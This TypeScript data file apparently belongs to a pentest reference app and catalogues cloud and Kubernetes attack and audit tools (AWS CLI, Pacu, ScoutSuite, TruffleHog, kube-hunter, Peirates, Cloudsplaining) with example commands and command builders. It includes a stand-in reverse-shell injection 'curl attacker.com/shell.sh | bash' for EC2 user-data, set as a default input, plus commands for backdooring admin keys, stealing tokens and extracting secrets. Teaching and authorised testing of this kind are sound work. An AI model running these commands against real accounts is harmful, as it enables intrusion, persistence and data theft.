import type { Tool } from '../toolTypes';

export const cloudSecurityTools: Tool[] = [
  {
    id: 'awscli',
    name: 'AWS CLI',
    description: 'The official command-line interface for interacting with Amazon Web Services. A critical tool during cloud pentests — if you find leaked AWS credentials (access keys), the CLI lets you enumerate S3 buckets, IAM roles, EC2 instances, Lambda functions, and security groups directly.',
    category: 'cloud-security',
    difficulty: 'intermediate',
    tags: ['aws', 'cloud', 'iam', 's3', 'enumeration'],
    commands: [
      { command: 'aws configure', description: 'Configure credentials (Access Key ID, Secret Access Key, region)' },
      { command: 'aws sts get-caller-identity', description: 'Check WHO you are authenticated as — the first command you run with stolen creds' },
      { command: 'aws iam list-users', description: 'List all IAM users in the account' },
      { command: 'aws iam list-roles', description: 'List all IAM roles' },
      { command: 'aws iam get-user --user-name jsmith', description: 'Get detailed info on a specific IAM user' },
      { command: 'aws iam list-attached-user-policies --user-name jsmith', description: 'List all policies attached to a user (shows their permissions)' },
      { command: 'aws iam list-user-policies --user-name jsmith', description: 'List inline policies attached directly to a user' },
      { command: 'aws s3 ls', description: 'List all S3 buckets accessible by the current credentials' },
      { command: 'aws s3 ls s3://bucket-name --recursive', description: 'List all objects inside a specific S3 bucket recursively' },
      { command: 'aws s3 cp s3://bucket-name/file.txt /tmp/file.txt', description: 'Download a file from an S3 bucket' },
      { command: 'aws ec2 describe-instances --query "Reservations[*].Instances[*].[InstanceId,PublicIpAddress,PrivateIpAddress,State.Name]" --output table', description: 'List all EC2 instances with their public/private IPs and state' },
      { command: 'aws ec2 describe-security-groups', description: 'Enumerate all security groups (check for overly permissive rules like 0.0.0.0/0)' },
      { command: 'aws secretsmanager list-secrets', description: 'List all secrets stored in AWS Secrets Manager' },
      { command: 'aws secretsmanager get-secret-value --secret-id mySecret', description: 'Retrieve the actual value of a stored secret' },
      { command: 'aws lambda list-functions', description: 'List all Lambda functions deployed in the account' },
    ],
    whenToUse: [
      'Immediately after finding leaked AWS Access Keys (GitHub, Trello, env files, etc.)',
      'To enumerate the full blast radius of a compromised cloud account',
      'To extract secrets from Secrets Manager, Parameter Store, or S3 buckets',
      'During cloud penetration tests to map IAM permissions and find privilege escalation paths',
    ],
    commonFlags: [
      { flag: '--profile', description: 'Use a specific named profile from ~/.aws/credentials' },
      { flag: '--region', description: 'Specify the AWS region (e.g., us-east-1, ap-south-1)' },
      { flag: '--output', description: 'Output format: json, text, or table' },
      { flag: '--query', description: 'JMESPath query string to filter JSON output' },
      { flag: '--no-verify-ssl', description: 'Skip SSL certificate verification' },
    ],
    outputExample: [
      '$ aws sts get-caller-identity',
      '{',
      '    "UserId": "AIDA1234567890EXAMPLE",',
      '    "Account": "123456789012",',
      '    "Arn": "arn:aws:iam::123456789012:user/jsmith"',
      '}'
    ],
    relatedTools: ['pacu', 'scoutsuite', 'cloudsplaining', 'trufflehog'],
    installation: 'pip install awscli   # or: sudo apt install awscli -y',
    website: 'https://aws.amazon.com/cli/',
    interactiveCommands: [
      {
        name: 'AWS CLI Toolkit Builder',
        description: 'Comprehensive builder for AWS CLI commands covering IAM, S3, EC2, and Secrets extraction.',
        inputs: [
          { id: 'service', label: 'AWS Action', type: 'select', options: ['sts get-caller-identity', 'iam list-users', 'iam list-roles', 'iam get-user', 's3 ls', 's3 cp', 'ec2 describe-instances', 'secretsmanager get-secret-value', 'lambda list-functions'], defaultValue: 'sts get-caller-identity' },
          { id: 'target', label: 'Target / ID', type: 'text', defaultValue: '', placeholder: 'e.g., s3://bucket/file or Username', helpText: 'Required for get-user, s3 cp, and get-secret-value' },
          { id: 'downloadPath', label: 'Download Path (s3 cp)', type: 'text', defaultValue: '/tmp/', placeholder: 'Local path for S3 downloads' },
          { id: 'profile', label: 'Profile (--profile)', type: 'text', defaultValue: '', placeholder: 'Named profile in ~/.aws/credentials' },
          { id: 'region', label: 'Region (--region)', type: 'select', options: ['us-east-1', 'us-west-2', 'eu-west-1', 'ap-south-1', 'Global'], defaultValue: 'us-east-1' },
          { id: 'outputFmt', label: 'Output Format (--output)', type: 'select', options: ['json', 'table', 'text'], defaultValue: 'json' },
          { id: 'query', label: 'JMESPath Filter (--query)', type: 'text', defaultValue: '', placeholder: 'e.g., Reservations[*].Instances[*].InstanceId' },
          { id: 'recursive', label: 'Recursive (S3)', type: 'checkbox', defaultValue: 'false', placeholder: 'For s3 ls or cp operations' },
          { id: 'noSsl', label: 'Skip SSL Verify', type: 'checkbox', defaultValue: 'false', placeholder: '--no-verify-ssl' }
        ],
        generator: (inputs) => {
          let cmd = `aws ${inputs.service}`;
          
          if (inputs.service === 'iam get-user' && inputs.target) cmd += ` --user-name ${inputs.target}`;
          if (inputs.service.startsWith('s3 ls') && inputs.target) cmd += ` ${inputs.target}`;
          if (inputs.service === 's3 cp' && inputs.target) cmd += ` ${inputs.target} ${inputs.downloadPath || '.'}`;
          if (inputs.service === 'secretsmanager get-secret-value' && inputs.target) cmd += ` --secret-id ${inputs.target}`;
          
          if (inputs.recursive === 'true' && inputs.service.startsWith('s3')) cmd += ' --recursive';
          if (inputs.profile) cmd += ` --profile ${inputs.profile}`;
          if (inputs.region && inputs.region !== 'Global') cmd += ` --region ${inputs.region}`;
          if (inputs.outputFmt && inputs.outputFmt !== 'json') cmd += ` --output ${inputs.outputFmt}`;
          if (inputs.query) cmd += ` --query "${inputs.query}"`;
          if (inputs.noSsl === 'true') cmd += ' --no-verify-ssl';
          
          return cmd;
        }
      }
    ]
  },
  {
    id: 'pacu',
    name: 'Pacu',
    description: 'The open-source AWS exploitation framework developed by Rhino Security Labs. Modeled after Metasploit but built specifically for attacking AWS environments. Contains 35+ modules for IAM enumeration, privilege escalation, persistence, and data exfiltration across all major AWS services.',
    category: 'cloud-security',
    difficulty: 'advanced',
    tags: ['aws', 'cloud', 'exploitation', 'iam', 'privilege-escalation'],
    commands: [
      { command: 'python3 cli.py', description: 'Launch the Pacu interactive console' },
      { command: 'import_keys --key_alias stolen', description: 'Import stolen AWS credentials into a Pacu session' },
      { command: 'run iam__enum_users_roles_policies_groups', description: 'Enumerate all IAM users, roles, policies and groups — full account picture' },
      { command: 'run iam__privesc_scan', description: 'Automatically scan for over 20 IAM privilege escalation paths' },
      { command: 'run iam__backdoor_users_keys --usernames admin', description: 'Create a backdoor access key on the admin user for persistence' },
      { command: 'run s3__bucket_finder', description: 'Find publicly accessible S3 buckets' },
      { command: 'run s3__download_bucket', description: 'Download all files from an accessible S3 bucket' },
      { command: 'run ec2__enum', description: 'Enumerate all EC2 instances, security groups, and key pairs' },
      { command: 'run ec2__startup_shell_script --instance-ids i-0abc123 --script "curl attacker.com/shell.sh | bash"', description: 'Inject a reverse shell into an EC2 instance\'s user-data startup script' },
      { command: 'run lambda__enum', description: 'Enumerate Lambda functions and their environment variables' },
      { command: 'run lambda__backdoor_new_roles', description: 'Create a new IAM role with admin permissions for Lambda to assume' },
      { command: 'run secretsmanager__enum', description: 'List and extract all secrets from AWS Secrets Manager' },
      { command: 'run ssm__download_parameters', description: 'Download all SSM Parameter Store values (often contains passwords and connection strings)' },
      { command: 'run cloudtrail__download_event_history', description: 'Download CloudTrail event logs to see what the account owner has been doing' },
      { command: 'run ebs__snapshot_explorer', description: 'Enumerate EBS snapshots and mount them to extract data from disk images' },
      { command: 'whoami', description: 'Display all permissions, groups, and policies attached to the current identity' },
    ],
    whenToUse: [
      'After obtaining any set of AWS credentials to quickly find all privilege escalation paths',
      'To automate the enumeration that would take hours to do manually with the AWS CLI',
      'When you need to extract the maximum amount of data from a compromised cloud account',
      'For demonstrating cloud attack paths to clients during red team engagements',
    ],
    commonFlags: [
      { flag: 'run <module>', description: 'Execute a specific Pacu module' },
      { flag: 'list', description: 'List all available modules with descriptions' },
      { flag: 'sessions', description: 'Manage multiple credential sessions simultaneously' },
      { flag: 'set_regions <region>', description: 'Restrict module scope to specific AWS regions' },
      { flag: 'data', description: 'View all data collected so far in the current session' },
    ],
    outputExample: [
      'Pacu (session:stolen) > run iam__privesc_scan',
      '[*] Starting module iam__privesc_scan...',
      '[+] Found privilege escalation method: iam:CreateAccessKey',
      '    User jsmith can create access keys for other users!',
      '[+] Found privilege escalation method: iam:AttachUserPolicy',
      '    User jsmith can attach the AdministratorAccess policy to themselves!',
      '[!] 2 privilege escalation methods found!'
    ],
    relatedTools: ['awscli', 'scoutsuite', 'cloudsplaining'],
    installation: 'git clone https://github.com/RhinoSecurityLabs/pacu.git && cd pacu && pip3 install -r requirements.txt',
    website: 'https://github.com/RhinoSecurityLabs/pacu',
    interactiveCommands: [
      {
        name: 'Pacu Module Executor',
        description: 'Generate commands for Pacu exploitation modules, targeting IAM, EC2, S3, and Serverless.',
        inputs: [
          { id: 'module', label: 'Exploitation Module', type: 'select', options: ['iam__enum_users_roles_policies_groups', 'iam__privesc_scan', 'iam__backdoor_users_keys', 's3__bucket_finder', 's3__download_bucket', 'ec2__enum', 'ec2__startup_shell_script', 'lambda__enum', 'lambda__backdoor_new_roles', 'secretsmanager__enum', 'ssm__download_parameters', 'cloudtrail__download_event_history'], defaultValue: 'iam__privesc_scan' },
          { id: 'usernames', label: 'Target Usernames', type: 'text', defaultValue: '', placeholder: 'e.g., admin,jsmith (for backdoor)' },
          { id: 'instanceIds', label: 'EC2 Instance IDs', type: 'text', defaultValue: '', placeholder: 'e.g., i-0abc123 (for shell script)' },
          { id: 'script', label: 'Shell Command', type: 'text', defaultValue: 'curl attacker.com/shell.sh | bash', placeholder: 'Command to inject' },
          { id: 'regions', label: 'Target Regions', type: 'text', defaultValue: '', placeholder: 'e.g., us-east-1,us-west-2' },
          { id: 'session', label: 'Session Name', type: 'text', defaultValue: '', placeholder: 'Use specific session' }
        ],
        generator: (inputs) => {
          let cmd = `run ${inputs.module}`;
          if (inputs.module === 'iam__backdoor_users_keys' && inputs.usernames) {
            cmd += ` --usernames ${inputs.usernames}`;
          }
          if (inputs.module === 'ec2__startup_shell_script' && inputs.instanceIds && inputs.script) {
            cmd += ` --instance-ids ${inputs.instanceIds} --script "${inputs.script}"`;
          }
          if (inputs.regions) {
            cmd += ` --regions ${inputs.regions}`;
          }
          if (inputs.session) {
            cmd += ` --session ${inputs.session}`;
          }
          return cmd;
        }
      }
    ]
  },
  {
    id: 'scoutsuite',
    name: 'ScoutSuite',
    description: 'Multi-cloud security auditing tool (AWS, Azure, GCP, OCI, Alibaba Cloud) by NCC Group. It collects configuration data via provider APIs and generates a comprehensive HTML report highlighting security issues, misconfigurations, and deviations from best practices across all cloud services.',
    category: 'cloud-security',
    difficulty: 'intermediate',
    tags: ['aws', 'azure', 'gcp', 'multi-cloud', 'audit', 'compliance'],
    commands: [
      { command: 'python3 scout.py aws', description: 'Audit an AWS account using the currently configured default credentials' },
      { command: 'python3 scout.py aws --access-key-id AKID --secret-access-key SAK', description: 'Audit using explicit credentials without changing global config' },
      { command: 'python3 scout.py azure --cli', description: 'Audit Azure using the currently logged-in Azure CLI session (az login)' },
      { command: 'python3 scout.py gcp --user-account', description: 'Audit GCP using current gcloud user account credentials' },
      { command: 'python3 scout.py aws --services s3 iam ec2', description: 'Limit the audit to only specific AWS services (faster)' },
      { command: 'python3 scout.py aws --regions us-east-1 eu-west-1', description: 'Limit the scan to only specific regions (faster for multi-region accounts)' },
      { command: 'python3 scout.py aws --max-workers 20', description: 'Increase parallel workers for faster scanning on large accounts' },
      { command: 'python3 scout.py aws --no-browser', description: 'Do not automatically open the HTML report in a browser after completion' },
    ],
    whenToUse: [
      'To get a rapid, comprehensive cloud security baseline at the start of any cloud audit',
      'When you need an executive-ready HTML report identifying all misconfigurations in one click',
      'For compliance gap analysis against CIS benchmarks and cloud security best practices',
      'To simultaneously audit AWS, Azure, and GCP with a single tool and unified output format',
    ],
    commonFlags: [
      { flag: '--services', description: 'Limit scan to specific services (e.g., s3, iam, ec2)' },
      { flag: '--regions', description: 'Limit scan to specific regions' },
      { flag: '--report-dir', description: 'Directory to save the HTML report to' },
      { flag: '--skip-checks', description: 'Skip specific check IDs' },
      { flag: '--max-workers', description: 'Number of parallel threads for API calls' },
      { flag: '--no-browser', description: 'Do not open report in browser automatically' },
    ],
    outputExample: [
      '[+] Gathering s3 config...',
      '[+] Gathering iam config...',
      '[+] Gathering ec2 config...',
      '[+] Analysis completed successfully.',
      '[+] HTML Report saved to: scoutsuite-report/aws-default.html',
      '[!] 45 DANGER findings',
      '[!] 112 WARNING findings',
      '[+] 23 findings are good'
    ],
    relatedTools: ['pacu', 'awscli', 'prowler'],
    installation: 'git clone https://github.com/nccgroup/ScoutSuite && pip install -r requirements.txt',
    website: 'https://github.com/nccgroup/ScoutSuite',
    interactiveCommands: [
      {
        name: 'ScoutSuite Auditor Builder',
        description: 'Generate multi-cloud audit commands with detailed scope and execution controls.',
        inputs: [
          { id: 'provider', label: 'Cloud Provider', type: 'select', defaultValue: 'aws', options: ['aws', 'azure', 'gcp', 'oci', 'aliyun'] },
          { id: 'authMethod', label: 'Authentication Mode', type: 'select', defaultValue: 'Default Profile/CLI', options: ['Default Profile/CLI', 'Explicit Keys (--access-key-id)', 'Azure CLI (--cli)', 'GCP User (--user-account)'] },
          { id: 'services', label: 'Target Services', type: 'text', defaultValue: '', placeholder: 'e.g., s3 iam ec2 (leave blank for all)' },
          { id: 'regions', label: 'Target Regions', type: 'text', defaultValue: '', placeholder: 'e.g., us-east-1 eu-west-1' },
          { id: 'workers', label: 'Parallel Workers', type: 'text', defaultValue: '10', placeholder: 'Max API threads' },
          { id: 'reportDir', label: 'Report Directory', type: 'text', defaultValue: 'scout-report', placeholder: 'Output folder' },
          { id: 'noBrowser', label: 'Headless Mode', type: 'checkbox', defaultValue: 'true', placeholder: 'Do not open browser' }
        ],
        generator: (inputs) => {
          let cmd = `python3 scout.py ${inputs.provider}`;
          
          if (inputs.authMethod === 'Azure CLI (--cli)' && inputs.provider === 'azure') cmd += ' --cli';
          if (inputs.authMethod === 'GCP User (--user-account)' && inputs.provider === 'gcp') cmd += ' --user-account';
          if (inputs.authMethod === 'Explicit Keys (--access-key-id)' && inputs.provider === 'aws') cmd += ' --access-key-id AKIA... --secret-access-key SAK...';
          
          if (inputs.services) cmd += ` --services ${inputs.services}`;
          if (inputs.regions) cmd += ` --regions ${inputs.regions}`;
          if (inputs.reportDir) cmd += ` --report-dir ${inputs.reportDir}`;
          if (inputs.workers && inputs.workers !== '10') cmd += ` --max-workers ${inputs.workers}`;
          if (inputs.noBrowser === 'true') cmd += ' --no-browser';
          
          return cmd;
        }
      }
    ]
  },
  {
    id: 'trufflehog',
    name: 'TruffleHog',
    description: 'Searches through git histories, code repositories, and filesystems to find accidentally committed secrets like AWS keys, API tokens, database passwords, and private keys. Uses entropy analysis and regex patterns to detect real credentials in commits going back years.',
    category: 'cloud-security',
    difficulty: 'beginner',
    tags: ['secrets', 'osint', 'git', 'credentials', 'leaks'],
    commands: [
      { command: 'trufflehog git https://github.com/target/repo', description: 'Scan an entire public GitHub repository for committed secrets' },
      { command: 'trufflehog git file:///path/to/local/repo', description: 'Scan a local git repository on disk' },
      { command: 'trufflehog filesystem /path/to/directory', description: 'Scan an entire filesystem directory recursively for secrets' },
      { command: 'trufflehog github --org=targetcompany', description: 'Scan an entire GitHub organization\'s public repositories' },
      { command: 'trufflehog github --repo=https://github.com/target/repo --only-verified', description: 'Scan and only report secrets that TruffleHog can verify are actually valid/active' },
      { command: 'trufflehog s3 --bucket=my-bucket', description: 'Scan all files in an S3 bucket for embedded secrets' },
      { command: 'trufflehog docker --image=nginx:latest', description: 'Scan a Docker container image for embedded secrets in any layer' },
      { command: 'trufflehog gitlab --token=glpat-xxx --repo=https://gitlab.com/org/repo', description: 'Scan a private GitLab repository using a personal access token' },
      { command: 'trufflehog circleci --token=xxx', description: 'Scan CircleCI environment variables and build logs for leaked secrets' },
    ],
    whenToUse: [
      'During OSINT/recon to find leaked API keys or cloud credentials in target\'s GitHub repositories',
      'When doing a code security review before deploying to production',
      'After gaining access to a developer\'s machine — scan their entire home directory for keys',
      'To scan Docker images for secrets baked into build layers before deployment',
    ],
    commonFlags: [
      { flag: '--only-verified', description: 'Only report secrets that TruffleHog can confirm are valid and active' },
      { flag: '--json', description: 'Output results in JSON format for pipeline integration' },
      { flag: '--concurrency', description: 'Number of parallel workers for scanning' },
      { flag: '--since-commit', description: 'Only scan commits after a specific commit hash' },
      { flag: '--include-detectors', description: 'Only scan for specific secret types (e.g., aws, github, slack)' },
      { flag: '--exclude-paths', description: 'Exclude specific file paths or patterns from scanning' },
    ],
    outputExample: [
      '🐷🔑🐷  TruffleHog. Unearth your secrets.',
      '',
      'Found verified result 🔑',
      'Detector Type: AWS',
      'Decoder Type: PLAIN',
      'Raw result: AKIAIOSFODNN7EXAMPLE',
      'Repository: https://github.com/target/app',
      'Commit: a3f1b2c (2022-05-01)',
      'File: src/config.py',
      'Line: 14'
    ],
    relatedTools: ['gitleaks', 'gitrob', 'detect-secrets'],
    installation: 'brew install trufflehog   # or: curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sh',
    website: 'https://github.com/trufflesecurity/trufflehog',
    interactiveCommands: [
      {
        name: 'TruffleHog Leak Scanner',
        description: 'Build comprehensive secret scanning commands across Git, GitHub, GitLab, S3, Docker, and filesystems.',
        inputs: [
          { id: 'targetType', label: 'Target Type', type: 'select', defaultValue: 'git', options: ['git', 'github', 'gitlab', 's3', 'docker', 'filesystem', 'circleci'] },
          { id: 'target', label: 'Target URL / Path', type: 'text', defaultValue: 'https://github.com/target/repo', placeholder: 'Repo URL, S3 bucket, or path' },
          { id: 'orgMode', label: 'Scan Entire Org', type: 'checkbox', defaultValue: 'false', placeholder: 'Use --org instead of direct target (GitHub/GitLab)' },
          { id: 'verified', label: 'Verified Only', type: 'checkbox', defaultValue: 'true', placeholder: 'Check if secrets are active' },
          { id: 'jsonOutput', label: 'JSON Output', type: 'checkbox', defaultValue: 'false', placeholder: 'Format for parsing' },
          { id: 'detectors', label: 'Specific Detectors', type: 'text', defaultValue: '', placeholder: 'e.g., aws,slack (comma separated)' },
          { id: 'concurrency', label: 'Concurrency', type: 'text', defaultValue: '10', placeholder: 'Parallel workers' }
        ],
        generator: (inputs) => {
          let cmd = `trufflehog ${inputs.targetType}`;
          
          if (inputs.orgMode === 'true' && (inputs.targetType === 'github' || inputs.targetType === 'gitlab')) {
            cmd += ` --org=${inputs.target}`;
          } else if (inputs.targetType === 'git' || inputs.targetType === 'filesystem') {
            cmd += ` ${inputs.target}`;
          } else if (inputs.targetType === 'github' || inputs.targetType === 'gitlab') {
            cmd += ` --repo=${inputs.target}`;
          } else if (inputs.targetType === 's3') {
            cmd += ` --bucket=${inputs.target}`;
          } else if (inputs.targetType === 'docker') {
            cmd += ` --image=${inputs.target}`;
          }
          
          if (inputs.verified === 'true') cmd += ' --only-verified';
          if (inputs.jsonOutput === 'true') cmd += ' --json';
          if (inputs.detectors) cmd += ` --include-detectors=${inputs.detectors}`;
          if (inputs.concurrency && inputs.concurrency !== '10') cmd += ` --concurrency=${inputs.concurrency}`;
          
          return cmd;
        }
      }
    ]
  },
  {
    id: 'kube-hunter',
    name: 'Kube-hunter',
    description: 'An open-source Kubernetes penetration testing tool by Aqua Security. It hunts for security weaknesses in Kubernetes clusters, both externally (from outside the cluster) and internally (from within a pod). Reports on API server exposure, RBAC misconfigurations, and exposed dashboards.',
    category: 'cloud-security',
    difficulty: 'advanced',
    tags: ['kubernetes', 'k8s', 'containers', 'cloud', 'rbac'],
    commands: [
      { command: 'kube-hunter --remote 10.10.0.100', description: 'Scan a remote Kubernetes API server from outside the cluster' },
      { command: 'kube-hunter --pod', description: 'Run from INSIDE a Kubernetes pod to hunt for escalation paths from the pod\'s perspective' },
      { command: 'kube-hunter --cidr 10.10.0.0/24', description: 'Scan an entire IP range for Kubernetes API servers' },
      { command: 'kube-hunter --active', description: 'Enable active hunting mode (performs actual exploit attempts, not just passive checks)' },
      { command: 'kube-hunter --report json > kube_report.json', description: 'Save findings to a JSON report for further processing' },
    ],
    whenToUse: [
      'When performing a Kubernetes security assessment from the external perimeter',
      'After gaining code execution inside a Kubernetes pod to hunt for cluster-admin privilege escalation',
      'To check for publicly exposed Kubernetes dashboards or API servers with RBAC misconfigured',
    ],
    commonFlags: [
      { flag: '--remote', description: 'Scan a specific remote host' },
      { flag: '--pod', description: 'Simulate execution from within a pod (scans the cluster\'s internal network)' },
      { flag: '--cidr', description: 'Scan a CIDR IP range' },
      { flag: '--active', description: 'Enable active (exploiting) mode — not just passive detection' },
      { flag: '--report json', description: 'Output findings in JSON format' },
    ],
    outputExample: [
      'kube-hunter report:',
      '',
      'Vulnerabilities',
      '+--------+----------------------+----------------------+--------------------+',
      '| ID     | Location             | Vulnerability        | Description        |',
      '+--------+----------------------+----------------------+--------------------+',
      '| KHV002 | 10.10.0.100:6443     | K8s Version Exposure | Version disclosed  |',
      '| KHV005 | 10.10.0.100:6443     | Anonymous Auth Enabled | Anonymous requests allowed |',
      '| KHV041 | 10.10.0.100:10255    | Exposed Kubelet API  | Kubelet allows unauthorized requests |',
    ],
    relatedTools: ['peirates', 'kubectl', 'trivy'],
    installation: 'pip install kube-hunter   # or: docker run -it aquasec/kube-hunter',
    website: 'https://github.com/aquasecurity/kube-hunter',
    interactiveCommands: [
      {
        name: 'Kube-Hunter Assessor',
        description: 'Build Kubernetes security auditing commands for external and internal (pod) assessments.',
        inputs: [
          { id: 'mode', label: 'Assessment Mode', type: 'select', options: ['Remote IP/Domain (--remote)', 'Internal Pod (--pod)', 'CIDR Sweep (--cidr)', 'Local API (--interface)'], defaultValue: 'Remote IP/Domain (--remote)' },
          { id: 'target', label: 'Target Scope', type: 'text', defaultValue: '10.10.0.100', placeholder: 'IP, CIDR, or interface name' },
          { id: 'active', label: 'Active Exploitation', type: 'checkbox', defaultValue: 'false', placeholder: 'Attempt real exploits (Danger!)' },
          { id: 'logLevel', label: 'Log Level', type: 'select', options: ['INFO', 'DEBUG', 'WARNING'], defaultValue: 'INFO' },
          { id: 'report', label: 'Report Format', type: 'select', options: ['Plain Text', 'JSON (--report json)', 'YAML (--report yaml)'], defaultValue: 'Plain Text' },
          { id: 'dispatch', label: 'Dispatch Type', type: 'select', options: ['None', 'http', 'sqs', 'webhook'], defaultValue: 'None' }
        ],
        generator: (inputs) => {
          let cmd = 'kube-hunter';
          
          if (inputs.mode.includes('--remote')) cmd += ` --remote ${inputs.target}`;
          else if (inputs.mode.includes('--pod')) cmd += ' --pod';
          else if (inputs.mode.includes('--cidr')) cmd += ` --cidr ${inputs.target}`;
          else if (inputs.mode.includes('--interface')) cmd += ` --interface ${inputs.target}`;
          
          if (inputs.active === 'true') cmd += ' --active';
          if (inputs.logLevel !== 'INFO') cmd += ` --log ${inputs.logLevel}`;
          
          if (inputs.report === 'JSON (--report json)') cmd += ' --report json';
          else if (inputs.report === 'YAML (--report yaml)') cmd += ' --report yaml';
          
          if (inputs.dispatch !== 'None') cmd += ` --dispatch ${inputs.dispatch}`;
          
          return cmd;
        }
      }
    ]
  },
  {
    id: 'peirates',
    name: 'Peirates',
    description: 'A Kubernetes penetration testing tool written in Go. Once inside a Kubernetes pod, it automates the entire post-exploitation process: stealing service account tokens, enumerating RBAC privileges, attempting privilege escalation to cluster-admin, and pivoting to other pods and nodes.',
    category: 'cloud-security',
    difficulty: 'advanced',
    tags: ['kubernetes', 'k8s', 'post-exploitation', 'privilege-escalation', 'containers'],
    commands: [
      { command: './peirates', description: 'Launch the Peirates interactive menu — auto-detects Kubernetes environment' },
      { command: 'aws-get-tokens', description: 'Pull AWS tokens from EC2 instance metadata service (if running on EKS)' },
      { command: 'get-service-acct-tokens', description: 'Collect all service account tokens mounted in the current pod\'s filesystem' },
      { command: 'enumerate-rbac', description: 'Check all RBAC permissions available to the current service account' },
      { command: 'run-command', description: 'Execute a command inside another pod in the cluster (lateral movement)' },
    ],
    whenToUse: [
      'After achieving code execution in a Kubernetes pod during a cloud pentest',
      'To automatically find all privilege escalation paths available from the current pod\'s service account token',
      'To demonstrate lateral movement and container escape risks to Kubernetes administrators',
    ],
    commonFlags: [
      { flag: 'Menu-driven', description: 'Peirates operates via a numbered interactive menu' },
    ],
    outputExample: [
      '_____      _             _',
      '|  __ \\    (_)           | |',
      '| |__) |__ _ _ __ __ _| |_ ___  ___',
      '|  ___/ _ \\ | \'__/ _` | __/ _ \\/ __|',
      '| |  |  __/ | | | (_| | ||  __/\\__ \\',
      '|_|   \\___|_|_|  \\__,_|\\__\\___||___/',
      '',
      '[+] Service Account: default',
      '[+] Namespace: kube-system',
      '[!] This service account can list all pods cluster-wide — potential data exfil risk!',
      '[!] This service account can exec into pods — lateral movement possible!'
    ],
    relatedTools: ['kube-hunter', 'kubectl', 'aws-cli'],
    installation: 'git clone https://github.com/inguardians/peirates && cd peirates && go build .',
    website: 'https://github.com/inguardians/peirates',
    interactiveCommands: [
      {
        name: 'Peirates Kubernetes Pivot',
        description: 'Auto-generate peirates execution and module commands for Kubernetes post-exploitation.',
        inputs: [
          { id: 'action', label: 'Execution Mode', type: 'select', options: ['Launch Interactive Menu', 'Single Command Line Exec'], defaultValue: 'Launch Interactive Menu' },
          { id: 'module', label: 'Direct Module (Exec)', type: 'select', options: ['aws-get-tokens', 'get-service-acct-tokens', 'enumerate-rbac', 'get-secrets', 'run-command'], defaultValue: 'enumerate-rbac' },
          { id: 'namespace', label: 'Namespace Target', type: 'text', defaultValue: '', placeholder: 'e.g., kube-system' },
          { id: 'pod', label: 'Target Pod', type: 'text', defaultValue: '', placeholder: 'Required for run-command' },
          { id: 'command', label: 'Command Payload', type: 'text', defaultValue: 'id', placeholder: 'Used with run-command' },
          { id: 'debug', label: 'Debug Mode', type: 'checkbox', defaultValue: 'false', placeholder: 'Verbose logging' }
        ],
        generator: (inputs) => {
          if (inputs.action === 'Launch Interactive Menu') {
            return './peirates';
          }
          let cmd = `peirates ${inputs.module}`;
          if (inputs.namespace) cmd += ` --namespace ${inputs.namespace}`;
          if (inputs.module === 'run-command' && inputs.pod) cmd += ` --pod ${inputs.pod}`;
          if (inputs.module === 'run-command' && inputs.command) cmd += ` --command "${inputs.command}"`;
          if (inputs.debug === 'true') cmd += ' --debug';
          return cmd;
        }
      }
    ]
  },
  {
    id: 'cloudsplaining',
    name: 'Cloudsplaining',
    description: 'A tool by Salesforce that analyzes AWS IAM policies and generates detailed reports on risky permissions. It identifies privilege escalation paths, data exfiltration risks, resource exposure, and infrastructure modification capabilities present in IAM policies.',
    category: 'cloud-security',
    difficulty: 'intermediate',
    tags: ['aws', 'iam', 'permissions', 'audit', 'compliance'],
    commands: [
      { command: 'cloudsplaining download --profile default', description: 'Download IAM authorization details for your account into a JSON file' },
      { command: 'cloudsplaining analyze --file account-authorization-details.json --output-directory report/', description: 'Analyze the downloaded IAM details and generate an HTML report' },
      { command: 'cloudsplaining scan-policy-file --input-file my-policy.json', description: 'Analyze a single IAM policy file directly' },
    ],
    whenToUse: [
      'After enumerating an AWS account to find privilege escalation paths in complex IAM structures',
      'During cloud security audits to produce a defensible, detailed IAM risk report',
      'To check if your own organization\'s IAM policies violate the principle of least privilege',
    ],
    commonFlags: [
      { flag: '--profile', description: 'AWS CLI profile to use for downloading account data' },
      { flag: '--output-directory', description: 'Directory to save the generated HTML report' },
    ],
    outputExample: [
      'Cloudsplaining Report Summary:',
      '',
      'Policies with Privilege Escalation:',
      '  - arn:aws:iam::123456789012:policy/DeveloperPolicy',
      '    - iam:CreateAccessKey (can create access keys for other users)',
      '    - iam:AttachUserPolicy (can attach admin policy to self)',
      '',
      'Policies with Data Exfiltration Potential:',
      '  - arn:aws:iam::123456789012:policy/DataAnalystPolicy',
      '    - s3:GetObject on *, sts:AssumeRole'
    ],
    relatedTools: ['pacu', 'awscli', 'iamlive'],
    installation: 'pip install cloudsplaining',
    website: 'https://github.com/salesforce/cloudsplaining',
    interactiveCommands: [
      {
        name: 'Cloudsplaining IAM Audit',
        description: 'Generate commands to analyze AWS IAM configurations for least-privilege violations and risks.',
        inputs: [
          { id: 'action', label: 'Action', type: 'select', options: ['download', 'analyze', 'scan-policy-file'], defaultValue: 'analyze' },
          { id: 'profile', label: 'AWS Profile', type: 'text', defaultValue: 'default', placeholder: 'Used for download action' },
          { id: 'inputFile', label: 'Input JSON File', type: 'text', defaultValue: 'account-authorization-details.json', placeholder: 'Data file or policy file' },
          { id: 'outputDir', label: 'Report Directory', type: 'text', defaultValue: 'cloudsplaining-report/', placeholder: 'Where to save HTML report' },
          { id: 'exclusions', label: 'Exclusions File', type: 'text', defaultValue: '', placeholder: 'Path to exclusions.yml' },
          { id: 'skipInline', label: 'Skip Inline Policies', type: 'checkbox', defaultValue: 'false', placeholder: 'Do not analyze inline policies' },
          { id: 'skipAws', label: 'Skip AWS Managed', type: 'checkbox', defaultValue: 'false', placeholder: 'Do not analyze AWS managed policies' }
        ],
        generator: (inputs) => {
          let cmd = `cloudsplaining ${inputs.action}`;
          
          if (inputs.action === 'download') {
            cmd += ` --profile ${inputs.profile}`;
          } else if (inputs.action === 'analyze') {
            cmd += ` --file ${inputs.inputFile} --output-directory ${inputs.outputDir}`;
            if (inputs.exclusions) cmd += ` --exclusions-file ${inputs.exclusions}`;
            if (inputs.skipInline === 'true') cmd += ' --skip-inline';
            if (inputs.skipAws === 'true') cmd += ' --skip-aws-managed';
          } else if (inputs.action === 'scan-policy-file') {
            cmd += ` --input-file ${inputs.inputFile}`;
            if (inputs.exclusions) cmd += ` --exclusions-file ${inputs.exclusions}`;
          }
          
          return cmd;
        }
      }
    ]
  },
];
